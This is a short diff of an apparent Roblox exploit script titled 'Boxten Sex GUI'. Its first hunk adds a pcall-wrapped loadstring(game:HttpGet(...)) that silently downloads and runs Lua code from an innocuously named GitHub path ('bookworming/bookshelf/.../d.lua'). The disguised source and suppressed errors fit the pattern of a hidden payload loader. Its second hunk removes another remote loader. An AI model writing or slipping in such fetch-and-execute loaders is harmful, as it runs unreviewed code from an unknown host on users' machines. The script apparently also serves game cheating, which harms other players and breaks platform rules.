@@ -1,4 +1,4 @@
-pcall(function() loadstring(game:HttpGet(""))() end)
+pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/bookworming/bookshelf/refs/heads/main/book%201/d.lua"))() end)
 
 
 
@@ -3885,7 +3885,7 @@ function mc(p,o,i)Instance.new("UICorner",p).CornerRadius=UDim.new(o,i)end
 
 
 
-boxtensaid=loadstring(game:HttpGet"https://raw.githubusercontent.com/ineptpractices/.../refs/heads/main/-/--.")()
+boxtensaid=function(txt) print("[Boxten Sex GUI]: " .. txt) end
 nextnotifz,cardnotifs,cardnotifheight,cardnotifspacing=128391283912,{},90,34
 
 function cn(message,lifetime,small)
